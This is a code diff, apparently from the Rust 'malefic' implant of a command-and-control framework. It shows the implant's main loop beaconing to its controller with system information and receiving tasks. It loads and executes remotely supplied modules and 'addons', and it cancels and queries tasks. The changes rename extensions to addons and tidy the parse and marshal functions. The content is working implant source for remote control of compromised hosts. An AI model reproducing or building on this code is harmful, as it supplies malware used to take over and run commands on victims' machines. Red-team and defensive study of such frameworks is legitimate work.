@@ -8,7 +8,7 @@ use malefic_helper::common::transport::{Client, ClientTrait};
 use malefic_helper::debug;
 use malefic_helper::protobuf::implantpb;
 use malefic_helper::protobuf::implantpb::spite::Body;
-use malefic_helper::protobuf::implantpb::{Spite, Spites, Status};
+use malefic_helper::protobuf::implantpb::{ImplantTask, Spite, Spites, Status};
 use crate::common::common::{new_error_spite, new_spite};
 use crate::{config, meta};
 use crate::common::error::MaleficError;
@@ -22,9 +22,9 @@ enum InternalModule {
     RefreshModule,
     ListModule,
     LoadModule,
-    LoadExtension,
-    ListExtension,
-    ExecuteExtension,
+    LoadAddon,
+    ListAddon,
+    ExecuteAddon,
     Clear,
     CancelTask,
     QueryTask,
@@ -37,9 +37,9 @@ impl InternalModule {
             InternalModule::RefreshModule => "refresh_module",
             InternalModule::ListModule => "list_module",
             InternalModule::LoadModule => "load_module",
-            InternalModule::LoadExtension => "load_extension",
-            InternalModule::ListExtension => "list_extension",
-            InternalModule::ExecuteExtension => "execute_extension",
+            InternalModule::LoadAddon => "load_addon",
+            InternalModule::ListAddon => "list_addon",
+            InternalModule::ExecuteAddon => "execute_addon",
             InternalModule::Clear => "clear",
             InternalModule::CancelTask => "cancel_task",
             InternalModule::QueryTask => "query_task",
@@ -52,9 +52,9 @@ impl InternalModule {
             InternalModule::RefreshModule,
             InternalModule::ListModule,
             InternalModule::LoadModule,
-            InternalModule::LoadExtension,
-            InternalModule::ListExtension,
-            InternalModule::ExecuteExtension,
+            InternalModule::LoadAddon,
+            InternalModule::ListAddon,
+            InternalModule::ExecuteAddon,
             InternalModule::Clear,
             InternalModule::CancelTask,
             InternalModule::QueryTask,
@@ -77,9 +77,9 @@ impl From<&str> for InternalModule {
             "refresh_module" => InternalModule::RefreshModule,
             "list_module" => InternalModule::ListModule,
             "load_module" => InternalModule::LoadModule,
-            "load_extension" => InternalModule::LoadExtension,
-            "list_extension" => InternalModule::ListExtension,
-            "execute_extension" => InternalModule::ExecuteExtension,
+            "load_addon" => InternalModule::LoadAddon,
+            "list_addon" => InternalModule::ListAddon,
+            "execute_addon" => InternalModule::ExecuteAddon,
             "clear" => InternalModule::Clear,
             "cancel_task" => InternalModule::CancelTask,
             "query_task" => InternalModule::QueryTask,
@@ -126,7 +126,7 @@ impl MaleficClient {
                 name: config::NAME.to_string(),
                 proxy: config::PROXY.to_string(),
                 module: self.manager.list_module(InternalModule::all()),
-                extension: Some(implantpb::Extensions{extensions: self.manager.list_extension()}),
+                addon: Some(implantpb::Addons{addons: self.manager.list_addon()}),
                 sysinfo,
                 timer: Some(implantpb::Timer {
                     interval: config::INTERVAL.clone(),
@@ -172,9 +172,9 @@ impl MaleficClient {
 
             let serialized_data: Vec<u8>;
             if let Ok(data) = self.channel.response_receiver.recv().await{
-                serialized_data = self.convert_spites_to_meta(data);
+                serialized_data = self.marshal(data);
             }else{
-                serialized_data = self.convert_spites_to_meta(empty_spites.clone());
+                serialized_data = self.marshal(empty_spites.clone());
             }
 
             let recv_data = self.client.send_with_read(serialized_data).await;
@@ -182,7 +182,7 @@ impl MaleficClient {
                 continue;
             }
 
-            if let Ok(spites) = MaleficParser::parser_tasks(recv_data) {
+            if let Ok(spites) = MaleficParser::parse(recv_data) {
                 debug!("{} spites ", spites.len());
                 for spite in spites {
                     if cfg!(debug_assertions) {
@@ -199,7 +199,7 @@ impl MaleficClient {
                             let error_id = if let Some(malefic_error) = e.downcast_ref::<MaleficError>() {
                                 malefic_error.id()
                             } else {
-                                999 // 例如，使用0作为未知错误的ID
+                                999
                             };
                             let _ = self.channel.data_sender.send(new_error_spite(spite.task_id, spite.name, error_id)).await;
                             continue;
@@ -210,7 +210,7 @@ impl MaleficClient {
         }
     }
 
-    fn convert_spites_to_meta(&self, bodys: Spites) -> Vec<u8> {
+    fn marshal(&self, bodys: Spites) -> Vec<u8> {
         let mut buf: Vec<u8> = Vec::new();
         if bodys.encode(&mut buf).is_err() {
             debug!("convert_spites_to_meta encode failed");
@@ -241,20 +241,20 @@ impl MaleficClient {
                 self.manager.load_module(spite.clone())?;
                 self.channel.data_sender.send(new_spite(spite.task_id, InternalModule::LoadModule.to_string(), Body::Empty(implantpb::Empty::default()))).await?;
             },
-            InternalModule::LoadExtension => {
-                self.manager.load_extension(spite.clone())?;
-                self.channel.data_sender.send(new_spite(spite.task_id, InternalModule::LoadExtension.to_string(), Body::Empty(implantpb::Empty::default()))).await?;
+            InternalModule::LoadAddon => {
+                self.manager.load_addon(spite.clone())?;
+                self.channel.data_sender.send(new_spite(spite.task_id, InternalModule::LoadAddon.to_string(), Body::Empty(implantpb::Empty::default()))).await?;
             },
-            InternalModule::ListExtension => {
+            InternalModule::ListAddon => {
                 let result = new_spite(
                     spite.task_id,
-                    InternalModule::ListExtension.to_string(),
-                    Body::Extensions(implantpb::Extensions{extensions: self.manager.list_extension()})
+                    InternalModule::ListAddon.to_string(),
+                    Body::Addons(implantpb::Addons{addons: self.manager.list_addon()})
                 );
                 self.channel.data_sender.send(result).await?;
             },
-            InternalModule::ExecuteExtension => {
-                let result = self.manager.execute_extension(spite)?;
+            InternalModule::ExecuteAddon => {
+                let result = self.manager.execute_addon(spite)?;
                 let module = self.manager.get_module(&result.name).ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                 let body = result.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                 self.channel.scheduler_task_sender.send((result.r#async, result.task_id, module.new_instance(), body)).await?;
@@ -264,14 +264,18 @@ impl MaleficClient {
                 self.channel.data_sender.send(new_spite(spite.task_id, InternalModule::Clear.to_string(), Body::Empty(implantpb::Empty::default()))).await?;
             },
             InternalModule::CancelTask => {
-                self.channel.scheduler_task_ctrl.send(TaskOperator::CancelTask(spite.task_id)).await?;
+                if let Some(Body::Task(task)) = spite.body {
+                    self.channel.scheduler_task_ctrl.send(TaskOperator::CancelTask(task.task_id)).await?;
+                }
             },
             InternalModule::QueryTask => {
-                self.channel.scheduler_task_ctrl.send(TaskOperator::QueryTask(spite.task_id)).await?;
+                if let Some(Body::Task(task)) = spite.body {
+                    self.channel.scheduler_task_ctrl.send(TaskOperator::QueryTask(task.task_id)).await?;
+                }
             },
             _ => {
-                let module = self.manager.get_module(&spite.name).ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                 let body = spite.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
+                let module = self.manager.get_module(&spite.name).ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                 self.channel.scheduler_task_sender.send((spite.r#async, spite.task_id, module.new_instance(), body)).await?;
             }
         };
@@ -280,31 +284,28 @@ impl MaleficClient {
 }
 
 impl MaleficParser {
-    fn parser_spites(data: &Vec<u8>) ->  Vec<implantpb::Spite> {
-        match Spites::decode(&data[..]) {
-            Ok(spites) => {
-                spites.spites
-            },
-            Err(err) => {
-                debug!("parser_promises error, {:?}", err);
-                return Vec::new();
-            }
-        }
-    }
-
-    pub fn parser_tasks(data: Vec<u8>) -> Result<Vec<implantpb::Spite>, MaleficError> {
+    pub fn parse(data: Vec<u8>) -> Result<Vec<implantpb::Spite>, MaleficError> {
+        // 解码数据
         let mut spite = meta::Spite::default();
         spite.unpack(data).map_err(|e| {
-            debug!("parser_tasks unpack failed: {:?}", e);
+            debug!("parse_data unpack failed: {:?}", e);
             MaleficError::UnpackError
         })?;
 
         // 检查spite数据是否为空
-        if spite.get_data().is_empty() {
-            debug!("parser_tasks data is empty");
+        let spite_data = spite.get_data();
+        if spite_data.is_empty() {
+            debug!("parse_data data is empty");
             return Err(MaleficError::MissBody);
         }
 
-        Ok(Self::parser_spites(spite.get_data()))
+        // 解析spite内容
+        match Spites::decode(&spite_data[..]) {
+            Ok(spites) => Ok(spites.spites),
+            Err(err) => {
+                debug!("parse_data decode error: {:?}", err);
+                Err(MaleficError::UnpackError)
+            }
+        }
     }
 }
